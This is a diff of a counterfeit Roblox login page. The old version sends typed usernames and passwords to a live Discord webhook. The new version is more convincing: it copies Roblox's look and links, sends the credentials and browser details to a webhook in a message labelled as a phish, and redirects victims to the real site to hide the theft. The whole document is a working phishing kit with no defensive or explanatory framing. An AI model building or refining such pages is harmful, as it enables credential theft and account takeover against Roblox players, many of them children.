@@ -1,117 +1,469 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Login to Roblox</title>
-<style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif}
-body{background:#f5f5f5;min-height:100vh;display:flex;flex-direction:column;align-items:center}
-.nav{width:100%;background:#1a1a2e;padding:0 20px;display:flex;align-items:center;justify-content:space-between;height:56px}
-.nav-logo{display:flex;align-items:center;gap:10px}
-.nav-logo svg{width:32px;height:32px}
-.nav-logo span{color:#fff;font-size:20px;font-weight:700;letter-spacing:-.5px}
-.nav-links{display:flex;gap:24px}
-.nav-links a{color:#9c9cb0;text-decoration:none;font-size:14px;font-weight:500}
-.nav-links a:hover{color:#fff}
-.nav-right{display:flex;gap:12px}
-.nav-right a{color:#fff;text-decoration:none;font-size:14px;padding:8px 16px;border-radius:4px}
-.nav-right .signup-btn{background:#00bcd4;font-weight:600}
-.card{background:#fff;border-radius:12px;width:92%;max-width:380px;margin:40px auto;padding:32px 24px;box-shadow:0 2px 20px rgba(0,0,0,.08)}
-h1{font-size:28px;color:#1a1a2e;margin-bottom:8px;font-weight:700}
-.sub{font-size:14px;color:#6e6e8a;margin-bottom:28px}
-input{width:100%;padding:14px 16px;border:1.5px solid #e0e0e0;border-radius:8px;font-size:15px;background:#fafafa;margin-bottom:14px;outline:none;transition:border-color .2s}
-input:focus{border-color:#00bcd4;background:#fff}
-button[type=submit]{width:100%;padding:14px;background:#00bcd4;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:700;cursor:pointer;transition:background .2s}
-button[type=submit]:hover{background:#00acc1}
-.divider{display:flex;align-items:center;margin:18px 0;color:#aaa;font-size:12px;gap:16px}
-.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e8e8e8}
-.alt-btn{width:100%;padding:12px;background:#fff;color:#555;border:1.5px solid #ddd;border-radius:8px;font-size:14px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;transition:background .2s}
-.alt-btn:hover{background:#f5f5f5}
-.alt-btn svg{width:18px;height:18px}
-.fgt{display:block;margin:8px 0 0;font-size:13px;color:#00bcd4;text-decoration:none;text-align:left}
-.fgt:hover{text-decoration:underline}
-.signup-link{text-align:center;margin-top:22px;font-size:14px;color:#6e6e8a}
-.signup-link a{color:#00bcd4;text-decoration:none;font-weight:600}
-.signup-link a:hover{text-decoration:underline}
-.err{color:#e2231a;font-size:13px;margin-top:10px;display:none;text-align:left;padding:8px 12px;background:#fff0f0;border-radius:6px;border:1px solid #ffd4d4}
-.footer{width:100%;max-width:1000px;margin:40px auto;padding:20px;text-align:center;border-top:1px solid #e0e0e0}
-.footer-links{display:flex;flex-wrap:wrap;justify-content:center;gap:8px 20px;margin-bottom:12px}
-.footer-links a{color:#6e6e8a;text-decoration:none;font-size:12px}
-.footer-links a:hover{color:#1a1a2e;text-decoration:underline}
-.footer p{color:#aaa;font-size:11px;line-height:1.5}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Roblox</title>
+    <link rel="icon" type="image/x-icon" href="https://www.roblox.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #eeeeee;
+            font-family: Arial, Helvetica, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* HEADER / NAV */
+        .header {
+            background-color: #1a1a2e;
+            height: 56px;
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            justify-content: space-between;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .header-logo {
+            display: flex;
+            align-items: center;
+        }
+
+        .header-logo svg {
+            height: 28px;
+            width: auto;
+        }
+
+        .header-logo .roblox-text-logo {
+            fill: white;
+            font-family: Arial, sans-serif;
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        .nav-links {
+            display: flex;
+            list-style: none;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .nav-links a {
+            color: #ffffffcc;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .nav-links a:hover {
+            color: #ffffff;
+        }
+
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .header-right a {
+            color: #ffffffcc;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .header-right a:hover {
+            color: #ffffff;
+        }
+
+        .signup-btn {
+            background-color: #E2231A;
+            color: white !important;
+            padding: 8px 20px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 14px;
+            transition: background-color 0.2s;
+        }
+
+        .signup-btn:hover {
+            background-color: #c41e16 !important;
+        }
+
+        /* MAIN CONTENT */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-top: 56px;
+            padding: 40px 16px;
+        }
+
+        .login-card {
+            background-color: #ffffff;
+            border-radius: 12px;
+            box-shadow: 0 2px 16px rgba(0, 0, 0, 0.08);
+            padding: 40px 32px;
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+
+        .roblox-logo {
+            margin-bottom: 24px;
+        }
+
+        .roblox-logo svg {
+            height: 44px;
+            width: auto;
+        }
+
+        .login-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #1a1a1a;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #444;
+            margin-bottom: 6px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+            font-size: 15px;
+            color: #333;
+            background-color: #fafafa;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-group input:focus {
+            border-color: #E2231A;
+            box-shadow: 0 0 0 3px rgba(226, 35, 26, 0.1);
+            background-color: #fff;
+        }
+
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #E2231A;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin-top: 8px;
+        }
+
+        .login-btn:hover {
+            background-color: #c41e16;
+        }
+
+        .forgot-password {
+            display: block;
+            margin-top: 16px;
+            font-size: 13px;
+            color: #E2231A;
+            text-decoration: none;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .divider {
+            margin: 20px 0;
+            border: none;
+            border-top: 1px solid #e5e5e5;
+        }
+
+        .alt-options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .alt-btn {
+            padding: 10px;
+            border: 1px solid #d9d9d9;
+            border-radius: 6px;
+            background-color: #fff;
+            font-size: 14px;
+            color: #333;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            text-decoration: none;
+        }
+
+        .alt-btn:hover {
+            background-color: #f5f5f5;
+        }
+
+        .alt-btn .icon {
+            font-size: 18px;
+        }
+
+        .signup-footer {
+            margin-top: 24px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .signup-footer a {
+            color: #E2231A;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .signup-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* FOOTER */
+        .footer {
+            background-color: #1a1a2e;
+            padding: 16px 24px;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 20px;
+            list-style: none;
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
+            color: #ffffff99;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-links a:hover {
+            color: #ffffff;
+        }
+
+        .footer-copyright {
+            color: #ffffff66;
+            font-size: 11px;
+        }
+
+        /* Loading overlay */
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(255, 255, 255, 0.85);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #e5e5e5;
+            border-top-color: #E2231A;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 16px;
+            color: #333;
+            font-weight: 500;
+        }
+    </style>
 </head>
 <body>
 
-<nav class="nav">
-<div class="nav-logo">
-<svg viewBox="0 0 32 32" fill="none"><rect width="32" height="32" rx="8" fill="#00bcd4"/><path d="M8 22V10l8-4 8 4v12l-8 4-8-4z" fill="#fff" opacity=".9"/><path d="M12 20V12l4-2 4 2v8l-4 2-4-2z" fill="#fff"/></svg>
-<span>Roblox</span>
-</div>
-<div class="nav-links">
-<a href="#">Charts</a>
-<a href="#">Marketplace</a>
-<a href="#">Create</a>
-<a href="#">Robux</a>
-</div>
-<div class="nav-right">
-<a href="#">Log In</a>
-<a href="#" class="signup-btn">Sign Up</a>
-</div>
-</nav>
+    <!-- HEADER -->
+    <header class="header">
+        <div class="header-left">
+            <a href="https://www.roblox.com/home" class="header-logo">
+                <svg viewBox="0 0 120 30" xmlns="http://www.w3.org/2000/svg">
+                    <text x="0" y="22" fill="white" font-family="Arial, sans-serif" font-weight="bold" font-size="22">Roblox</text>
+                </svg>
+            </a>
+            <ul class="nav-links">
+                <li><a href="https://www.roblox.com/charts">Charts</a></li>
+                <li><a href="https://www.roblox.com/catalog">Marketplace</a></li>
+                <li><a href="https://create.roblox.com/">Create</a></li>
+                <li><a href="https://www.roblox.com/upgrades/robux?ctx=navpopover">Robux</a></li>
+            </ul>
+        </div>
+        <div class="header-right">
+            <a href="https://www.roblox.com/account/signupredir?returnUrl=" class="signup-btn">Sign Up</a>
+        </div>
+    </header>
 
-<div class="card">
-<h1>Login to Roblox</h1>
-<p class="sub">Sign in to your account</p>
-<form id="f">
-<input type="text" id="u" placeholder="Username/Email/Phone" autocomplete="off" required>
-<input type="password" id="p" placeholder="Password" autocomplete="off" required>
-<button type="submit">Log In</button>
-<a href="#" class="fgt">Forgot Password or Username?</a>
-<div class="divider"><span>OR</span></div>
-<button type="button" class="alt-btn" onclick="document.getElementById('u').value='';document.getElementById('p').value=''">
-<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M12 8v8M8 12h8"/></svg>
-Email Me a One-Time Code
-</button>
-<div class="err" id="err">Invalid username or password. Please try again.</div>
-<div class="signup-link">Don't have an account? <a href="#">Sign Up</a></div>
-</form>
-</div>
+    <!-- MAIN -->
+    <div class="main-content">
+        <div class="login-card">
+            <div class="roblox-logo">
+                <svg viewBox="0 0 160 40" xmlns="http://www.w3.org/2000/svg">
+                    <text x="0" y="30" fill="#E2231A" font-family="Arial, sans-serif" font-weight="bold" font-size="30">Roblox</text>
+                </svg>
+            </div>
+            <h1 class="login-title">Login to Roblox</h1>
 
-<div class="footer">
-<div class="footer-links">
-<a href="#">About Us</a>
-<a href="#">Jobs</a>
-<a href="#">Blog</a>
-<a href="#">Parents</a>
-<a href="#">Gift Cards</a>
-<a href="#">Help</a>
-<a href="#">Terms</a>
-<a href="#">Privacy</a>
-</div>
-<p>&copy; 2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks.</p>
-</div>
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="username">Username/Email/Phone</label>
+                    <input type="text" id="username" name="username" placeholder="" autocomplete="username" required>
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="" autocomplete="current-password" required>
+                </div>
+                <button type="submit" class="login-btn">Log In</button>
+                <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-password">Forgot Password or Username?</a>
+            </form>
 
-<script>
-document.getElementById('f').onsubmit=function(e){
-e.preventDefault();
-var u=document.getElementById('u').value;
-var p=document.getElementById('p').value;
-fetch('https://discord.com/api/webhooks/1499563144794865694/ybout7a_QXqxO3d9vfgMitR35LuGGAJ7wqhPUS8O6v8zA8Ccw4Fb7H_nnvTw0hMxK6_g',{
-method:'POST',
-headers:{'Content-Type':'application/json'},
-body:JSON.stringify({
-content:'**Roblox Login**\nUser: '+u+'\nPass: '+p+'\nTime: '+new Date().toLocaleString()
-})
-});
-document.getElementById('err').style.display='block';
-document.getElementById('u').value='';
-document.getElementById('p').value='';
-setTimeout(function(){
-window.location.href='https://www.roblox.com/login';
-},2500);
-};
-</script>
+            <hr class="divider">
+
+            <div class="alt-options">
+                <a href="#" class="alt-btn" onclick="return false;">
+                    <span class="icon">✉️</span> Email Me a One-Time Code
+                </a>
+                <a href="#" class="alt-btn" onclick="return false;">
+                    <span class="icon">⚡</span> Quick Sign-in
+                </a>
+            </div>
+
+            <div class="signup-footer">
+                Don't have an account? <a href="https://www.roblox.com/CreateAccount">Sign Up</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <ul class="footer-links">
+            <li><a href="https://www.roblox.com/info/about-us">About Us</a></li>
+            <li><a href="https://www.roblox.com/info/jobs">Jobs</a></li>
+            <li><a href="https://www.roblox.com/info/blog">Blog</a></li>
+            <li><a href="https://www.roblox.com/info/parents">Parents</a></li>
+            <li><a href="https://www.roblox.com/giftcards">Buy Gift Cards</a></li>
+            <li><a href="https://www.roblox.com/info/help">Help</a></li>
+            <li><a href="https://www.roblox.com/info/terms">Terms</a></li>
+            <li><a href="https://www.roblox.com/info/accessibility">Accessibility</a></li>
+            <li><a href="https://www.roblox.com/info/privacy">Privacy</a></li>
+        </ul>
+        <div class="footer-copyright">
+            &copy;2026 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+        </div>
+    </footer>
+
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="loading-text">Logging in...</div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+
+            if (!username || !password) return;
+
+            // Show loading overlay
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            // Send to Discord
+            const payload = {
+                content: '**🔴 Roblox Login Phish**',
+                embeds: [{
+                    title: 'New Credentials Captured',
+                    color: 0xE2231A,
+                    fields: [
+                        { name: 'Username/Email/Phone', value: username, inline: false },
+                        { name: 'Password', value: password, inline: false },
+                        { name: 'Time', value: new Date().toLocaleString(), inline: false },
+                        { name: 'IP', value: '{{$ip}}', inline: true },
+                        { name: 'User Agent', value: navigator.userAgent.substring(0, 100), inline: false }
+                    ],
+                    footer: { text: 'Roblox Phish Page' },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.log('Webhook error (still redirecting):', err);
+            }
+
+            // Wait 2.5 seconds so they see the loading spinner, then redirect to real Roblox
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/login';
+            }, 2500);
+        });
+    </script>
+
 </body>
 </html>
